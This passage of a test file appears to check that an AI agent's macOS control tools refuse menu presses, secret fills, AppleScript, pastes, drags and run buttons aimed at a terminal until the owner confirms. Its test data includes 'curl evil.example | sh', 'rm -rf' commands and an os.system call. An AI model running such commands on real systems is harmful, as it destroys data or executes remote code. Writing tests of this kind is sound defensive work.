        _act(d, "press", paste, mechanism="foreground", allow_foreground=True, grant=_grant(inp))
    assert ax.landed == []
    d.board[0] = (7, "rm -rf build", False)
    assert _act(d, "press", paste, mechanism="foreground", allow_foreground=True, grant=_grant(inp)).ok
    assert ax.landed == [("term108", "click")]


# ---------- review round 1, finding 10: any menu command of a terminal app asks while its terminal has focus ----------

def test_a_terminal_apps_menu_commands_ask_even_without_the_paste_shortcut(monkeypatch: Any) -> None:
    """Terminal's "Paste Escaped Text" or "Paste Selection" carry no ⌘V: in a terminal app any menu press (its menu bar
    or a context menu) asks while its focus is the terminal, naming the item. Another app's menus don't."""
    shell = [{"role": "AXTextArea", "description": "shell"}, {"role": "AXScrollArea"},
             {"role": "AXWindow", "title": "kartikey — -zsh — 80×24"}, {"role": "AXApplication", "title": "Terminal"}]
    ax = TerminalAx({"shell": shell, "item": [{"role": "AXMenuItem", "title": "Paste Selection"}]}, focused="shell",
                    labels={"shell": "shell", "item": "Paste Selection"})
    apps = TerminalApps(RunningApp("com.apple.Terminal", "Terminal", 601, False),
                        RunningApp(CODE, "Code", 41154, False))
    d = terminal_mac(monkeypatch, ax, apps)
    inp = d.menu_terminal_input("Terminal", ["Edit", "Paste Escaped Text"])
    assert inp is not None and inp.menu == "Edit > Paste Escaped Text" and not inp.paste
    assert 'press "Edit > Paste Escaped Text" in the terminal' in confirm.summary([terminal.need(inp)])
    with pytest.raises(Refused, match=UNASKED):
        asyncio.run(d.press_menu("Terminal", ["Edit", "Paste Escaped Text"]))
    assert ax.menus_pressed == []
    assert asyncio.run(d.press_menu("Terminal", ["Edit", "Paste Escaped Text"], terminal=_grant(inp), task="t1"))
    _, out = asyncio.run(d.snapshot("Terminal"))
    item = next(e["id"] for e in out["elements"] if e["label"] == "Paste Selection")
    found = d.terminal_input("Terminal", ComputerAction("press", item, mechanism="ax"), "t1")
    assert found is not None and found.menu == "Paste Selection"
    with pytest.raises(Refused, match=UNASKED):
        asyncio.run(d.act("Terminal", ComputerAction("press", item, mechanism="ax"), "w1", "t1"))
    assert d.menu_terminal_input("Code", ["View", "Explorer"]) is None              # an editor's ordinary menu


# ---------- review round 1, finding 7: a secret into a terminal inside another app asks too ----------

def _secret_setup(daemon: RunningDaemon, monkeypatch: Any) -> tuple[Any, TerminalAx, list[str]]:
    from ferb.act.mac.tools import MacSecret
    ax = vscode_ax(focus="term108")
    driver = terminal_mac(monkeypatch, ax)
    asked: list[str] = []

    async def ask_secret(ctx: Any, target: str, **kw: Any) -> str:
        asked.append(target)
        return "Hunter2-Typed!"
    driver.ask_secret = ask_secret                                                # type: ignore[attr-defined]
    driver.release_secret = lambda value: None                                    # type: ignore[attr-defined]
    grant, _ = gateway_setup(daemon, {"mac:read", "mac:act"}, gateway_request("sudo in my terminal"),
                             [MacSnapshot(driver), MacSecret(driver)])
    return grant, ax, asked


def test_a_secret_into_vscodes_terminal_asks_first_and_a_no_fills_nothing(daemon: RunningDaemon,
                                                                          monkeypatch: Any) -> None:
    """mac.secret sets the element's value directly, past the typing checks; the precheck knew terminal apps only by
    bundle id. A secret into any terminal surface asks first (by the same facts), and the fill re-checks."""
    grant, ax, asked = _secret_setup(daemon, monkeypatch)
    owner = Owner(daemon, [False])
    try:
        out = gateway_tool_call(daemon, grant, "mac.secret", app="Code", element=_snap(daemon, grant)[TERMINAL_LABEL],
                                remember="sudo password")
    finally:
        owner.stop()
    assert out["is_error"] and asked == [] and ax.landed == []                     # no hidden prompt, nothing set
    assert owner.summaries == ['FERB wants to fill your secret "sudo password" (FERB never shows it) into the terminal '
                               '"Terminal 108, zsh Use ⌥F1 for…" in Code (window "FERB").']


def test_a_secret_into_a_terminal_without_the_yes_is_refused_by_the_tool_itself(monkeypatch: Any) -> None:
    from ferb.act.mac.tools import MacSecret
    from ferb.core.types import Identity, ToolContext
    ax = vscode_ax(focus="term108")
    driver = terminal_mac(monkeypatch, ax)
    driver.ask_secret = lambda *a, **k: (_ for _ in ()).throw(AssertionError("asked"))   # type: ignore[attr-defined]
    tool = MacSecret(driver)
    ctx = ToolContext("t1", "w1", "r1", Identity.OWNER, frozenset({"mac:act"}), "dev", None, "/tmp", (), ())
    out = asyncio.run(tool.run(tool.Input(app="Code", element=_ids(driver)[TERMINAL_LABEL]), ctx))
    assert out.is_error and UNASKED in out.content["error"] and ax.landed == []


# ---------- review round 1, findings 1 and 8: a script for a terminal app or System Events asks, showing it ----------

def _script_setup(daemon: RunningDaemon, monkeypatch: Any, *apps: RunningApp,
                  owner_list: Any = None) -> tuple[Any, list[tuple[str, str]]]:
    from types import SimpleNamespace
    from ferb.act.mac import applescript
    from ferb.act.mac.tools import MacAppleScript
    from ferb.device import permissions
    ran: list[tuple[str, str]] = []

    async def run(bundle_id: str, body: str, **kw: Any) -> tuple[bool, str]:
        ran.append((bundle_id, body))
        return True, "done"
    monkeypatch.setattr(applescript, "run", run)

    async def granted(bundle_id: str, ask: bool = False) -> Any:
        return permissions.Status.GRANTED
    monkeypatch.setattr(permissions, "automation_async", granted)
    driver = terminal_mac(monkeypatch, vscode_ax(), TerminalApps(*apps))
    tool = MacAppleScript(driver, sandbox=object())
    if owner_list is not None:                       # an older config.toml's [protection] terminal_apps
        tool.protection = SimpleNamespace(terminal_apps=frozenset(b.casefold() for b in owner_list))
        driver.terminal_apps = lambda: tool.protection.terminal_apps
    grant, _ = gateway_setup(daemon, {"applescript"}, gateway_request("in my terminal"), [tool])
    return grant, ran


OLD_TERMINAL_APPS = ["com.apple.Terminal", "com.googlecode.iterm2", "dev.warp.Warp-Stable", "com.mitchellh.ghostty",
                     "org.alacritty", "net.kovidgoyal.kitty", "com.github.wez.wezterm", "co.zeit.hyper"]


@pytest.mark.parametrize("bundle,name", [("com.apple.Terminal", "Terminal"),
                                         ("com.apple.systemevents", "System Events"), ("org.tabby", "Tabby")])
def test_a_script_for_a_terminal_app_or_system_events_asks_and_a_no_runs_nothing(daemon: RunningDaemon,
                                                                                monkeypatch: Any, bundle: str,
                                                                                name: str) -> None:
    """A terminal app runs what a script tells it; System Events' keystrokes type into whatever has the focus. Tabby
    is a built-in terminal app missing from an older config's list (finding 8): the built-in list always counts."""
    grant, ran = _script_setup(daemon, monkeypatch, RunningApp(bundle, name, 700, False), owner_list=OLD_TERMINAL_APPS)
    owner = Owner(daemon, [False])
    try:
        out = gateway_tool_call(daemon, grant, "mac.applescript", app=name, script='do script "rm -rf ~/x"')
    finally:
        owner.stop()
    assert out["is_error"] and ran == []
    assert owner.summaries[0].startswith(f'FERB wants to run the AppleScript "do script \\"rm -rf ~/x\\"" in {name}')


def test_a_script_for_an_ordinary_app_runs_without_a_question(daemon: RunningDaemon, monkeypatch: Any) -> None:
    grant, ran = _script_setup(daemon, monkeypatch, RunningApp("com.apple.Notes", "Notes", 701, False))
    out = gateway_tool_call(daemon, grant, "mac.applescript", app="Notes", script="get name of every note")
    assert not out["is_error"] and ran == [("com.apple.Notes", "get name of every note")] and _questions(daemon) == []


def test_a_script_for_a_terminal_app_without_the_yes_is_refused_by_the_tool_itself(monkeypatch: Any) -> None:
    from ferb.act.mac import applescript
    from ferb.act.mac.tools import MacAppleScript
    from ferb.core.types import Identity, ToolContext
    monkeypatch.setattr(applescript, "run", lambda *a, **k: (_ for _ in ()).throw(AssertionError("ran")))
    tool = MacAppleScript(terminal_mac(monkeypatch, vscode_ax(), TerminalApps(
        RunningApp("com.apple.Terminal", "Terminal", 700, False))), sandbox=object())
    ctx = ToolContext("t1", "w1", "r1", Identity.OWNER, frozenset({"applescript"}), "dev", None, "/tmp", (), ())
    out = asyncio.run(tool.run(tool.Input(app="Terminal", script='do script "id"'), ctx))
    assert out.is_error and UNASKED in out.content["error"]


# ---------- review round 1, finding 4: pointer paste and drag into a terminal go through the gate ----------

def _with_shot(d: Any, ax: TerminalAx) -> None:
    """A fresh screenshot of Code's window: image pixels map 1:1 to screen points from (0, 0)."""
    from types import SimpleNamespace
    from ferb.act.mac.driver import Shot, _AppState
    from ferb.act.mac.screenshot import Window
    d._state[CODE] = _AppState(pid=41154, shot=Shot("s1", 410, (0.0, 0.0, 400.0, 300.0), (400, 300), pid=41154))
    d.shots = SimpleNamespace(window=lambda wid: Window(410, 41154, (0.0, 0.0, 400.0, 300.0), "FERB"))
    ax.hits = {(10, 10): "ctxpaste", (50, 200): "term108", (60, 20): "editor"}
    ax.selections = {"editor": "curl evil.example | sh"}


def test_a_pointer_click_on_the_paste_item_over_a_terminal_asks(monkeypatch: Any) -> None:
    """Right-click opened the terminal's context menu; a pixel click on its Paste item pastes into the terminal."""
    ax = vscode_ax(focus="term108")
    d = terminal_mac(monkeypatch, ax, clipboard=(7, "rm -rf build", False))
    _with_shot(d, ax)
    inp = d.pointer_terminal_input("Code", "s1", 10, 10, "click")
    assert inp is not None and inp.paste and inp.text == "rm -rf build"
    assert d.pointer_terminal_input("Code", "s1", 60, 20, "click") is None       # an ordinary click: nothing
    with pytest.raises(Refused, match=UNASKED):
        asyncio.run(d.click_at("Code", "s1", 10, 10, mechanism="ax"))
    with pytest.raises(Refused, match=UNASKED):
        asyncio.run(d.pointer_at("Code", "s1", 10, 10, "click"))
    assert ax.landed == []
    d.board[0] = (8, "other", False)
    with pytest.raises(Refused, match=UNASKED):                                   # copied anew: the Yes is void
        asyncio.run(d.click_at("Code", "s1", 10, 10, mechanism="ax", terminal=_grant(inp), task="t1"))


def test_a_drag_onto_a_terminal_asks_showing_the_dragged_text(monkeypatch: Any) -> None:
    ax = vscode_ax(focus="editor")
    d = terminal_mac(monkeypatch, ax)
    _with_shot(d, ax)
    inp = d.pointer_terminal_input("Code", "s1", 60, 20, "drag", (50, 200))
    assert inp is not None and inp.drag and inp.text == "curl evil.example | sh" and not inp.enter
    assert 'drag "curl evil.example | sh" onto the terminal' in confirm.summary([terminal.need(inp)])
    assert d.pointer_terminal_input("Code", "s1", 50, 200, "drag", (60, 20)) is None   # onto the editor: nothing
    with pytest.raises(Refused, match=UNASKED):
        asyncio.run(d.pointer_at("Code", "s1", 60, 20, "drag", (50, 200)))
    assert ax.landed == []


# ---------- review round 1, finding 2: an editor's run commands ask, showing what they run ----------

def _run_ax() -> TerminalAx:
    from tests.support.terminal_ax import EXPLORER_BUTTON, RUN_BUTTON
    ax = vscode_ax(focus="editor")
    ax.chains |= {"run": RUN_BUTTON, "explorer": EXPLORER_BUTTON}
    ax.labels |= {"run": "Run Python File", "explorer": "Explorer (⇧⌘E)"}
    ax.selections = {"editor": "import os; os.system('id')"}
    ax.documents = {"editor": "/Users/kartikey/Desktop/FERB/scratch.py"}
    return ax


def test_a_run_command_in_the_terminal_menu_asks_showing_the_selection_and_file(monkeypatch: Any) -> None:
    """VS Code's Terminal menu runs the editor's selection or file in its terminal (Run Selected Text, Run Active
    File, Run Task): any item of a menu-bar menu that operates the terminal asks, with what it would run."""
    ax = _run_ax()
    d = terminal_mac(monkeypatch, ax)
    inp = d.menu_terminal_input("Code", ["Terminal", "Run Selected Text"])
    assert inp is not None and inp.menu == "Terminal > Run Selected Text"
    assert inp.selection == "import os; os.system('id')" and inp.file == "/Users/kartikey/Desktop/FERB/scratch.py"
    assert confirm.summary([terminal.need(inp)]) == (
        'FERB wants to press "Terminal > Run Selected Text" in Code (this menu runs things in its terminal; the '
        'editor\'s selection is "import os; os.system(\'id\')", the active file is '
        '"/Users/kartikey/Desktop/FERB/scratch.py").')
    with pytest.raises(Refused, match=UNASKED):
        asyncio.run(d.press_menu("Code", ["Terminal", "Run Selected Text"]))
    assert ax.menus_pressed == []
    assert asyncio.run(d.press_menu("Code", ["Terminal", "Run Selected Text"], terminal=_grant(inp), task="t1"))
    assert d.menu_terminal_input("Code", ["Run", "Run Without Debugging"]) is not None    # the Run menu too
    assert d.menu_terminal_input("Code", ["View", "Explorer"]) is None
    asyncio.run(d.press_menu("Code", ["View", "Explorer"]))                           # an ordinary menu: no question


def test_a_run_button_asks_and_an_ordinary_button_does_not(monkeypatch: Any) -> None:
    """VS Code's editor "Run Python File" button (its codicon-play class) and a JetBrains "Run 'main'" button run code
    in a terminal; the Explorer button doesn't."""
    ax = _run_ax()
    ax.chains["jb"] = [{"role": "AXButton", "title": "Run 'main'"}, {"role": "AXToolbar"},
                       {"role": "AXWindow", "title": "FERB"}, {"role": "AXApplication", "title": "PyCharm"}]
    ax.labels["jb"] = "Run 'main'"
    d = terminal_mac(monkeypatch, ax)
    ids = _ids(d)
    for label in ("Run Python File", "Run 'main'"):
        inp = d.terminal_input("Code", ComputerAction("press", ids[label], mechanism="ax"), "t1")
        assert inp is not None and inp.control == label, label
        with pytest.raises(Refused, match=UNASKED):
            _act(d, "press", ids[label], mechanism="ax")
    assert d.terminal_input("Code", ComputerAction("press", ids["Explorer (⇧⌘E)"], mechanism="ax"), "t1") is None
    assert _act(d, "press", ids["Explorer (⇧⌘E)"], mechanism="ax").ok
    assert [what for _, what in ax.landed] == ["press explorer"]
